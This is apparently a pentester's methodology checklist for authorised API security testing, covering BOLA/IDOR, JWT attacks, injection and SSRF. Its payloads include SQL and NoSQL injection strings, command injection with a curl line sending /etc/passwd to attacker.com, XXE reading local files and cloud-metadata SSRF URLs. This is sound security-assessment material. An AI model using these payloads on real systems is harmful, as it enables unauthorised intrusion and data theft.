# API Technical Testing Checklist

Systematic methodology for hands-on security testing of APIs. Work through phases sequentially, documenting all attempts in [[API-03-Request-Tracker]].

Related: [[API-01-Admin-Checklist]] | [[API-04-Evidence-Collection]] | [[API-05-Reporting-Template]]

---

## Testing Phases Overview

1. [[#Phase 1 Reconnaissance & Mapping]] (30-60 min)
2. [[#Phase 2 Authentication Testing]] (45-60 min)
3. [[#Phase 3 Authorization Testing (BOLA/IDOR)]] (1-2 hours) **MOST CRITICAL**
4. [[#Phase 4 Input Validation & Injection]] (1-2 hours)
5. [[#Phase 5 Business Logic Testing]] (1-2 hours)
6. [[#Phase 6 Rate Limiting & Resource Management]] (30-45 min)
7. [[#Phase 7 Information Disclosure]] (30-45 min)
8. [[#Phase 8 Advanced Exploitation]] (time varies)

---

## Phase 1: Reconnaissance & Mapping

**Objective**: Enumerate all endpoints, parameters, and understand API structure

### Burp Setup
- [ ] Configure browser/client to proxy through Burp
- [ ] Verify traffic capturing correctly
- [ ] Create new Burp project: `[ClientName]_API_[Date]`
- [ ] Set scope to target domain(s)
- [ ] Enable response interception (if needed)

### API Specification Discovery
- [ ] Check for `/swagger.json`, `/openapi.json`, `/api-docs`
- [ ] Check for `/graphql` (GraphQL introspection)
- [ ] Check for `/.well-known/` endpoints
- [ ] Look for WADL files (SOAP/REST)
- [ ] Check for WSDL files (SOAP): `?wsdl`, `?WSDL`, `?singleWsdl`
- [ ] Review robots.txt for hidden paths
- [ ] Check HTML comments and JavaScript for API references

**Common spec locations**:
```
/api/swagger.json
/api/v1/swagger.json
/api-docs
/swagger/v1/swagger.json
/docs
/documentation
/api/docs
/.well-known/openapi.yaml
```

**Log**: [[API-03-Request-Tracker#Discovery]]

### Endpoint Enumeration

#### Manual Exploration
- [ ] Browse application normally (capture all API calls in Burp)
- [ ] Test all features (authenticated and unauthenticated)
- [ ] Check Burp site map for discovered endpoints
- [ ] Note HTTP methods supported (GET, POST, PUT, DELETE, PATCH, OPTIONS)

#### Automated Discovery
- [ ] Use Burp Spider/Crawler
- [ ] Kiterunner for endpoint discovery:
  ```bash
  kr scan https://api.target.com -w /path/to/wordlist.txt
  ```
- [ ] ffuf for path fuzzing:
  ```bash
  ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
  ```
- [ ] Arjun for parameter discovery:
  ```bash
  arjun -u https://api.target.com/endpoint
  ```

### HTTP Methods Testing
For each endpoint, test all HTTP methods:
- [ ] OPTIONS (check if introspection is allowed)
- [ ] GET (should be idempotent)
- [ ] POST
- [ ] PUT
- [ ] PATCH
- [ ] DELETE (critical - can we delete data?)
- [ ] HEAD
- [ ] TRACE (if enabled, potential security issue)

**Test**: Send OPTIONS request to each endpoint
```http
OPTIONS /api/users/123 HTTP/1.1
Host: api.target.com
```

Response should show allowed methods:
```http
Allow: GET, POST, PUT, DELETE
```

- [ ] Try methods not listed in Allow header
- [ ] Try DELETE on read-only endpoints
- [ ] Try PUT/PATCH without authorization

**Screenshot**: [[API-04-Evidence-Collection#Methods Testing]]

### Parameter Discovery
- [ ] Use Burp Param Miner extension
- [ ] Use Arjun for automated parameter discovery
- [ ] Test for undocumented parameters in Burp Intruder
- [ ] Check for mass assignment vulnerabilities (test writable fields)

Common parameters to test:
```
id, user_id, account_id, admin, role, email, password, token,
api_key, debug, test, internal, hidden, _method, format, callback
```

### Version Enumeration
- [ ] Test old API versions: `/api/v1/`, `/api/v2/`, etc.
- [ ] Test version in headers: `API-Version:`, `X-API-Version:`
- [ ] Test version in query params: `?version=1`, `?v=1`
- [ ] Document which versions are accessible

**Screenshot**: Different versions accessible

---

## Phase 2: Authentication Testing

**Objective**: Test credential policies, token security, and session management

Reference: [[API-06-Quick-Reference#Authentication Attacks]]

### Credential Policy Testing
- [ ] Test weak passwords (if registration available)
- [ ] Test common passwords: `password`, `123456`, `admin`, etc.
- [ ] Test password complexity requirements
- [ ] Test username enumeration via registration/login
- [ ] Test account lockout policy (brute force protection)
- [ ] Test password reset flow

**Username Enumeration**:
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "valid_user", "password": "wrong"}
vs
{"username": "invalid_user", "password": "wrong"}
```

Look for different response times, status codes, or messages.

**Log**: [[API-03-Request-Tracker#Auth Testing]]

### JWT Testing (if applicable)

#### JWT Structure Analysis
- [ ] Decode JWT (use jwt.io or jwt_tool)
- [ ] Review claims (sub, iat, exp, etc.)
- [ ] Check for sensitive data in claims
- [ ] Note signing algorithm (alg header)

**Decode JWT**:
```bash
# Using jwt_tool
python3 jwt_tool.py [TOKEN]

# Manual base64 decode
echo "eyJhbGc..." | base64 -d
```

#### Algorithm Confusion Attacks
- [ ] **None algorithm attack**: Change `"alg": "RS256"` to `"alg": "none"`
  ```json
  {"alg": "none", "typ": "JWT"}
  ```
  - [ ] Remove signature (everything after second period)
  - [ ] Send modified token

- [ ] **HS256 to RS256**: If using asymmetric algorithm, try symmetric
  - [ ] Download public key
  - [ ] Use public key as HMAC secret
  - [ ] Re-sign token with HS256

**Tools**:
```bash
# jwt_tool for automated attacks
python3 jwt_tool.py [TOKEN] -T

# Try all common attacks
python3 jwt_tool.py [TOKEN] -M at
```

#### JWT Claims Manipulation
- [ ] Change `sub` (subject/user ID) to another user
- [ ] Change `role` to admin (if present)
- [ ] Extend `exp` (expiration) to future date
- [ ] Remove `exp` entirely (does it accept?)
- [ ] Change `iat` (issued at) to past/future
- [ ] Add custom claims (test for mass assignment)

#### JWT Weak Secrets
- [ ] Brute force HMAC secret (if HS256/HS512)
  ```bash
  # Using hashcat
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
  
  # Using jwt_tool
  python3 jwt_tool.py [TOKEN] -C -d /usr/share/wordlists/rockyou.txt
  ```

#### JWT Validation Bypass
- [ ] Send request without token (does it fail?)
- [ ] Send empty token
- [ ] Send token with tampered signature
- [ ] Send expired token
- [ ] Replay old token (test revocation)

**Screenshot**: [[API-04-Evidence-Collection#JWT Exploit]]

### API Key Testing (if applicable)
- [ ] Test API key in different locations (header, query, body)
- [ ] Test without API key (is it actually required?)
- [ ] Test with empty API key
- [ ] Test with invalid API key
- [ ] Test API key from different user (cross-account)
- [ ] Look for API keys in:
  - [ ] JavaScript files
  - [ ] Mobile app decompilation
  - [ ] GitHub repos (use GitHub dorking)
  - [ ] Postman collections
  - [ ] Documentation

**GitHub Dorking**:
```
"api.target.com" "api_key"
"api.target.com" "apikey"
organization:target "api"
```

### Session Management (if using cookies)
- [ ] Check cookie flags (HttpOnly, Secure, SameSite)
- [ ] Test session fixation
- [ ] Test concurrent sessions
- [ ] Test session timeout
- [ ] Test logout (is session truly invalidated?)
- [ ] Test CSRF protection

### OAuth 2.0 Testing (if applicable)
- [ ] Test redirect_uri manipulation (open redirect)
- [ ] Test authorization code reuse
- [ ] Test token leakage via Referer header
- [ ] Test implicit flow (deprecated, insecure)
- [ ] Test scope manipulation
- [ ] Test state parameter (CSRF protection)

---

## Phase 3: Authorization Testing (BOLA/IDOR)

**Objective**: Test for broken object level authorization - **MOST CRITICAL API VULNERABILITY**

Reference: [[API-06-Quick-Reference#BOLA Attacks]]

### Horizontal Privilege Escalation (BOLA/IDOR)

**Core concept**: User A accessing User B's data by changing IDs

#### Setup
- [ ] Create two test accounts (User A and User B)
- [ ] Note User A's IDs/tokens
- [ ] Note User B's IDs/tokens
- [ ] Identify all endpoints that use object IDs

#### Testing Pattern
For EVERY endpoint with an ID parameter:

1. **Authenticate as User A**
2. **Make request with User B's ID**
3. **Check if you get User B's data**

**Example**:
```http
GET /api/users/123/profile HTTP/1.1
Authorization: Bearer [USER_A_TOKEN]
Host: api.target.com
```

If you get back data for user 123 (User B), that's BOLA.

#### Common ID Parameters to Test
- [ ] `/api/users/{id}`
- [ ] `/api/accounts/{id}`
- [ ] `/api/orders/{id}`
- [ ] `/api/documents/{id}`
- [ ] `/api/messages/{id}`
- [ ] `/api/invoices/{id}`
- [ ] `/api/reports/{id}`
- [ ] Any endpoint with: `{id}`, `{user_id}`, `{account_id}`, etc.

#### ID Enumeration Techniques
- [ ] **Sequential IDs**: Try id-1, id+1, id+100, etc.
- [ ] **UUIDs**: Still testable (try with different user's UUID)
- [ ] **Encoded IDs**: Decode (base64, hex) and increment
- [ ] **Hashed IDs**: Try known hash formats
- [ ] **Query parameter IDs**: `?user=123`
- [ ] **Body parameter IDs**: `{"user_id": 123}`

#### BOLA Testing Checklist
For each object type:
- [ ] GET (read other user's data)
- [ ] PUT/PATCH (modify other user's data)
- [ ] DELETE (delete other user's data)
- [ ] POST (create object for other user)

**Burp Automation**:
- Use Intruder with payload type: Numbers (sequential)
- Use Autorize extension for automatic testing
- Use InQL for GraphQL BOLA testing

**Log ALL attempts**: [[API-03-Request-Tracker#BOLA Testing]]

**Screenshot**: [[API-04-Evidence-Collection#BOLA Proof]]
- Request showing User A's token
- Response showing User B's data

### Vertical Privilege Escalation

**Core concept**: Regular user accessing admin functions

#### Admin Endpoint Discovery
- [ ] Check for `/api/admin/*` endpoints
- [ ] Test `/api/users` vs `/api/admin/users`
- [ ] Look for `role` parameter in requests
- [ ] Check Burp history for admin API calls
- [ ] Fuzz for admin endpoints:
  ```
  /api/admin
  /api/administrator
  /api/superuser
  /api/internal
  /api/debug
  /api/v1/admin
  ```

#### Function-Level Authorization Testing
- [ ] Access admin endpoints as regular user
- [ ] Try HTTP method override: `X-HTTP-Method-Override: DELETE`
- [ ] Test parameter pollution: `?admin=true&admin=false`
- [ ] Test mass assignment: Add `"role": "admin"` to request body

**Example**:
```http
POST /api/users HTTP/1.1
Authorization: Bearer [REGULAR_USER_TOKEN]
Content-Type: application/json

{
  "email": "attacker@evil.com",
  "role": "admin"    <-- Try adding this
}
```

#### Admin Function Abuse
If you identify admin functions, test:
- [ ] User management (create/delete users)
- [ ] Role assignment
- [ ] System configuration changes
- [ ] Bulk operations (export all data)
- [ ] Sensitive operations (password reset for other users)

**Log**: [[API-03-Request-Tracker#Privilege Escalation]]

---

## Phase 4: Input Validation & Injection

**Objective**: Test for injection vulnerabilities and input handling flaws

### SQL Injection

#### Quick SQLi Test
For each parameter, try:
- [ ] Single quote: `'`
- [ ] Double quote: `"`
- [ ] SQL comment: `--`, `#`, `/* */`
- [ ] Boolean tests: `' OR '1'='1`, `' AND '1'='2`
- [ ] Time-based: `'; WAITFOR DELAY '00:00:05'--`
- [ ] Union-based: `' UNION SELECT NULL--`

**Test locations**:
- [ ] Query parameters: `?id=1'`
- [ ] Path parameters: `/api/users/1'`
- [ ] Request body (JSON): `{"id": "1'"}`
- [ ] Headers: `X-User-ID: 1'`

**Automated testing**:
```bash
# SQLMap
sqlmap -u "https://api.target.com/users?id=1" --headers="Authorization: Bearer TOKEN" --batch --risk=3 --level=5

# Burp Scanner
# Right-click request > Scan > SQL Injection
```

**Log**: [[API-03-Request-Tracker#SQLi Attempts]]

### NoSQL Injection

For MongoDB and other NoSQL databases:

**JSON-based injection**:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^a"}}
```

**Query parameter injection**:
```
?username[$ne]=null&password[$ne]=null
?username[$gt]=&password[$gt]=
```

**Test for**:
- [ ] Authentication bypass
- [ ] Data extraction via regex
- [ ] Timing attacks (large regex)

**Tools**:
```bash
# NoSQLMap
python nosqlmap.py -u "https://api.target.com/login" -p "username,password"
```

### Command Injection

**Test payloads**:
```
; whoami
| whoami
& whoami
&& whoami
|| whoami
` whoami `
$( whoami )
```

**Common vulnerable parameters**:
- File names
- IP addresses
- URLs
- Email addresses
- Any parameter that might be passed to system command

**Time-based detection**:
```
; sleep 5
| sleep 5 #
& ping -c 5 127.0.0.1
```

**Exfiltration**:
```
; curl https://attacker.com?data=$(cat /etc/passwd | base64)
```

### XXE (XML External Entity)

For XML-based APIs:

**Basic XXE test**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>
  <username>&xxe;</username>
</user>
```

**Blind XXE (out-of-band)**:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
```

**Test endpoints**:
- [ ] Any endpoint accepting XML
- [ ] SOAP APIs
- [ ] File upload (if XML files accepted)
- [ ] Content-Type manipulation (JSON to XML)

### Mass Assignment

**Objective**: Add unauthorized fields to requests

**Test pattern**:
1. Create normal request
2. Add extra fields that shouldn't be writable
3. Check if they're accepted

**Example**:
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "email": "test@example.com",
  "password": "Password123",
  "role": "admin",              <-- Add this
  "is_verified": true,          <-- And this
  "credits": 9999999            <-- And this
}
```

**Common fields to test**:
```
role, admin, is_admin, is_staff, is_superuser, is_verified,
credits, balance, price, discount, permission, permissions,
status, approved, verified, active, enabled
```

**GraphQL mass assignment**:
```graphql
mutation {
  updateUser(id: 123, input: {
    email: "new@example.com"
    role: "admin"        <-- Add unauthorized field
  }) {
    id
    email
    role
  }
}
```

**Log**: [[API-03-Request-Tracker#Mass Assignment]]

### Type Confusion

**Test**: Send unexpected data types

**Examples**:
```json
// Expect string, send array
{"user_id": ["123"]}

// Expect number, send string
{"amount": "not-a-number"}

// Expect string, send object
{"email": {"$ne": null}}

// Expect boolean, send string
{"admin": "true"}

// Expect array, send string
{"items": "not-an-array"}
```

**Look for**:
- [ ] Type coercion leading to logic bypass
- [ ] Application errors revealing internals
- [ ] Unexpected behavior

### Parameter Pollution

**HTTP Parameter Pollution (HPP)**:
```
?admin=false&admin=true
?id=1&id=2
?role=user&role=admin
```

**Different servers handle duplicates differently**:
- Some use first value
- Some use last value
- Some concatenate
- Some use array

**Test in**:
- [ ] Query parameters
- [ ] POST body (form-encoded)
- [ ] Cookies

---

## Phase 5: Business Logic Testing

**Objective**: Test for flaws in application workflows and business rules

Reference: [[API-06-Quick-Reference#Business Logic]]

### Workflow Bypass

**Common patterns to test**:

#### Payment/Checkout Flow
- [ ] Skip payment step (go directly to confirmation)
- [ ] Modify total amount
- [ ] Apply multiple discount codes
- [ ] Use expired coupons
- [ ] Negative quantities (to increase balance)
- [ ] Replay successful payment (get items twice)

**Example sequence**:
```
Normal flow:
1. POST /api/cart/add
2. POST /api/cart/checkout
3. POST /api/payment/process
4. GET /api/order/confirm

Test: Skip step 3, go directly to step 4
```

#### Multi-Step Forms
- [ ] Submit final step without completing previous steps
- [ ] Modify hidden fields
- [ ] Resubmit old steps with new data
- [ ] Access steps out of order

#### Approval Workflows
- [ ] Submit for approval then immediately access as if approved
- [ ] Modify status field: `{"status": "approved"}`
- [ ] Bypass approval via different endpoint

### Race Conditions

**Setup**: Need to send multiple requests simultaneously

**Burp Turbo Intruder**:
```python
# Send 20 simultaneous requests
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20)
    for i in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

**Common race condition tests**:
- [ ] **Coupon redemption**: Redeem same coupon multiple times
- [ ] **Withdrawals**: Withdraw same balance multiple times
- [ ] **Voting**: Vote multiple times
- [ ] **Limited items**: Purchase more than available stock

**Example**:
```
User has $100 balance
Send 10 simultaneous requests to withdraw $100
If race condition exists: total withdrawn = $1000
```

**Log**: [[API-03-Request-Tracker#Race Conditions]]

### Price Manipulation

- [ ] Negative prices: `{"price": -100}`
- [ ] Zero prices: `{"price": 0}`
- [ ] Very small decimals: `{"price": 0.01}`
- [ ] Integer overflow: `{"price": 2147483647}`
- [ ] Currency mismatch (if multi-currency)
- [ ] Modify price in cart
- [ ] Modify price during checkout

### Quantity/Limits Bypass

- [ ] Negative quantities
- [ ] Zero quantities
- [ ] Excessive quantities (more than stock)
- [ ] Float quantities: `{"quantity": 1.5}` (get half-price?)
- [ ] Exceed rate limits via different endpoints
- [ ] Exceed size limits via chunking

---

## Phase 6: Rate Limiting & Resource Management

**Objective**: Test for DoS vulnerabilities and resource exhaustion

### Rate Limit Testing

#### Identify Rate Limits
- [ ] Send multiple rapid requests
- [ ] Note when 429 (Too Many Requests) is returned
- [ ] Check response headers:
  ```
  X-RateLimit-Limit: 100
  X-RateLimit-Remaining: 0
  X-RateLimit-Reset: 1234567890
  ```

#### Rate Limit Bypass Techniques
- [ ] **IP rotation**: Use proxies or VPN
- [ ] **Header manipulation**:
  ```
  X-Forwarded-For: 1.2.3.4
  X-Real-IP: 1.2.3.4
  X-Originating-IP: 1.2.3.4
  ```
- [ ] **Different HTTP methods**: If GET is limited, try POST
- [ ] **Different endpoints**: Rate limit per-endpoint vs global?
- [ ] **API versioning**: v1 limited but v2 is not?
- [ ] **Multiple API keys**: Create multiple accounts
- [ ] **Case manipulation**: `/api/Users` vs `/api/users`
- [ ] **Encoding bypass**: URL-encode path segments

**Burp Intruder test**:
- Set payload type: Numbers, sequential
- Send 100+ requests rapidly
- Check for rate limiting

### Resource Exhaustion

#### Large Payloads
- [ ] Send extremely large JSON (10MB+)
- [ ] Send deeply nested JSON (1000+ levels)
- [ ] Send array with millions of items
- [ ] Upload large files (if applicable)

**Example**:
```json
{
  "a": {
    "b": {
      "c": {
        "d": {
          ... (nest 1000 levels deep)
        }
      }
    }
  }
}
```

#### Regex DoS (ReDoS)
- [ ] Test input fields with complex regex patterns
- [ ] Exponential backtracking patterns:
  ```
  (a+)+$
  (a|a)*$
  (a|ab)*$
  ```

**Test payloads**:
```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX
```

#### GraphQL-Specific DoS
- [ ] **Deep nested queries**:
  ```graphql
  query {
    user {
      posts {
        comments {
          author {
            posts {
              comments {
                # ... nest 100 levels
              }
            }
          }
        }
      }
    }
  }
  ```

- [ ] **Circular queries** (if introspection enabled)
- [ ] **Batch queries** (alias abuse):
  ```graphql
  query {
    user1: user(id: 1) { ... }
    user2: user(id: 2) { ... }
    user3: user(id: 3) { ... }
    # ... repeat 1000 times
  }
  ```

### Pagination Abuse

- [ ] Request excessive page sizes: `?limit=999999`
- [ ] Negative page numbers: `?page=-1`
- [ ] Skip pagination: No limit parameter
- [ ] Pagination+filter bypass to extract all data

---

## Phase 7: Information Disclosure

**Objective**: Identify sensitive data leakage

### Error Message Analysis

**Trigger errors deliberately**:
- [ ] Invalid input types
- [ ] Missing required fields
- [ ] Malformed JSON/XML
- [ ] Very long inputs
- [ ] Special characters
- [ ] SQL/NoSQL injection attempts

**Look for**:
- [ ] Stack traces (language, framework, libraries)
- [ ] File paths (C:\app\src\controllers\user.php)
- [ ] Database errors (table names, column names)
- [ ] Internal IP addresses
- [ ] Version information
- [ ] Debugging information

**Screenshot**: [[API-04-Evidence-Collection#Error Messages]]

### Verbose Responses

- [ ] Check for excessive data in responses
- [ ] Compare authenticated vs unauthenticated responses
- [ ] Check for PII in responses:
  - [ ] Email addresses
  - [ ] Phone numbers
  - [ ] Physical addresses
  - [ ] SSN/Tax IDs
  - [ ] Credit card info (even partial)
- [ ] Check for internal fields:
  - [ ] Database IDs
  - [ ] Creation timestamps
  - [ ] Internal notes
  - [ ] Admin flags

**Example problematic response**:
```json
{
  "user": {
    "id": 123,
    "email": "user@example.com",
    "password_hash": "bcrypt...",     <-- Should NOT be here
    "ssn": "123-45-6789",             <-- Should NOT be here
    "internal_notes": "VIP customer", <-- Should NOT be here
    "is_admin": false,                <-- Could be useful for attacker
    "created_at": "2024-01-01",
    "credit_card_last4": "1234"       <-- Maybe okay, maybe not
  }
}
```

### Technology Fingerprinting

**Response headers revealing tech stack**:
- [ ] `Server: Express, Django, Apache, nginx`
- [ ] `X-Powered-By: PHP/7.4, Express`
- [ ] `X-AspNet-Version`
- [ ] `X-AspNetMvc-Version`
- [ ] Framework-specific headers

**Look for version info**:
- [ ] Error messages
- [ ] Login pages
- [ ] API documentation
- [ ] `/version`, `/api/version` endpoints

---

## Phase 8: Advanced Exploitation

### SSRF (Server-Side Request Forgery)

**Test if API makes requests to URLs you control**:

#### URL Parameter Testing
- [ ] Any parameter accepting URLs
- [ ] Webhook URLs
- [ ] Avatar/image URLs
- [ ] Import/export functionality
- [ ] Fetch/proxy endpoints

**Test payloads**:
```
# External callback
https://attacker.com/callback

# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# Cloud metadata (Azure)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Cloud metadata (GCP)
http://metadata.google.internal/computeMetadata/v1/
```

**Internal network scanning**:
```
http://localhost:80
http://127.0.0.1:8080
http://0.0.0.0:9000
http://[::]:80
http://127.1:80
http://192.168.1.1
```

**Bypass filters**:
```
# URL encoding
http://127.0.0.1 → http%3A%2F%2F127.0.0.1

# Decimal IP
http://2130706433 (127.0.0.1 in decimal)

# Hex IP
http://0x7f.0x0.0x0.0x1

# Domain redirect
http://ssrf.attacker.com (redirects to localhost)
```

**Log**: [[API-03-Request-Tracker#SSRF Attempts]]

### GraphQL Introspection

If GraphQL is in use:

**Enable introspection** (send to `/graphql`):
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

This reveals the entire schema including:
- All types
- All fields
- All mutations
- Hidden/undocumented features

**Tools**:
```bash
# GraphQL Voyager (visualize schema)
# InQL Burp extension
# GraphQL IDE
```

**Then test**:
- [ ] All discovered mutations
- [ ] Hidden admin queries
- [ ] BOLA on all object types
- [ ] Batch query abuse

### API Key Leakage

**Search for API keys in**:
- [ ] JavaScript files (view-source, Burp Spider)
- [ ] Mobile apps (decompile APK/IPA)
- [ ] GitHub (use automated tools):
  ```bash
  # truffleHog
  truffleHog git https://github.com/target/repo
  
  # GitLeaks
  gitleaks detect --source /path/to/repo
  ```
- [ ] Postman collections (public workspaces)
- [ ] Documentation
- [ ] Environment files leaked (.env)

### Insecure Direct Object References (IDOR) in Files

- [ ] Test file download endpoints with different IDs
- [ ] Test for directory traversal: `?file=../../../etc/passwd`
- [ ] Enumerate file IDs: `?file_id=1`, `?file_id=2`, etc.
- [ ] Test file deletion with other users' file IDs

### Chained Exploits

Document multi-step exploitation chains:

**Example chain: IDOR → Mass Assignment → Admin Access**

1. IDOR to read admin user data
2. Note admin's user_id
3. Mass assignment to set your role=admin
4. Now access admin endpoints

**Log**: [[API-03-Request-Tracker#Exploit Chains]]

---

## GraphQL-Specific Testing

### Introspection
- [ ] Query `__schema` (as shown above)
- [ ] Enumerate all types, queries, mutations
- [ ] Look for debug/internal queries

### Batching Attacks
- [ ] Send multiple operations in one request
- [ ] Bypass rate limiting via batching
- [ ] Extract data faster via aliases

### Nested Query DoS
- [ ] Create deeply nested queries
- [ ] Test query depth limits
- [ ] Test query complexity limits

### Field Suggestion
- [ ] Send invalid field names
- [ ] Check error messages for suggested fields (reveals schema)

---

## REST-Specific Testing

### Content-Type Testing
- [ ] JSON → XML conversion attempt
- [ ] XML → JSON conversion attempt
- [ ] Test unsupported content types
- [ ] Content-Type override

### HTTP Method Override
- [ ] `X-HTTP-Method-Override: PUT`
- [ ] `X-HTTP-Method: DELETE`
- [ ] `X-Method-Override: PATCH`
- [ ] Test method override via query param: `?_method=DELETE`

### Accept Header Manipulation
```http
Accept: application/json
Accept: application/xml
Accept: text/html
Accept: */*
```

Look for different responses or errors.

---

## Testing Completion Checklist

### Documentation Complete
- [ ] All phases attempted and documented
- [ ] [[API-03-Request-Tracker]] fully populated
- [ ] [[API-04-Evidence-Collection]] has all screenshots
- [ ] High/Critical findings have PoC documented
- [ ] Business impact assessed for each finding
- [ ] Burp project saved

### Evidence Collected
- [ ] Screenshots organized and named
- [ ] Burp requests/responses exported
- [ ] cURL commands documented (for reproduction)
- [ ] Postman collection created (if useful)
- [ ] PoC scripts saved

### Findings Ready for Report
- [ ] Findings prioritized (Critical/High/Medium/Low)
- [ ] Each finding has clear PoC
- [ ] OWASP API Top 10 mapping complete
- [ ] Remediation recommendations drafted
- [ ] Risk ratings justified

### Client Communication
- [ ] Critical findings reported immediately (if found)
- [ ] Testing completion confirmed with client
- [ ] Credentials/access returned or destroyed
- [ ] Final debrief scheduled

---

## Post-Testing

### Cleanup
- [ ] Delete any test accounts created
- [ ] Remove any test data created
- [ ] Verify no persistent changes remain

### Reporting
Proceed to [[API-05-Reporting-Template]] to document findings.

---

## Tags
#technical-testing #methodology #api-testing #hands-on #checklist #owasp

---

## Related Documents
- [[API-00-Overview|Overview]]
- [[API-01-Admin-Checklist|Admin Checklist]]
- [[API-03-Request-Tracker|Request Tracker]]
- [[API-04-Evidence-Collection|Evidence Collection]]
- [[API-05-Reporting-Template|Reporting Template]]
- [[API-06-Quick-Reference|Quick Reference]]

---
*Created: 2026-01-21*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
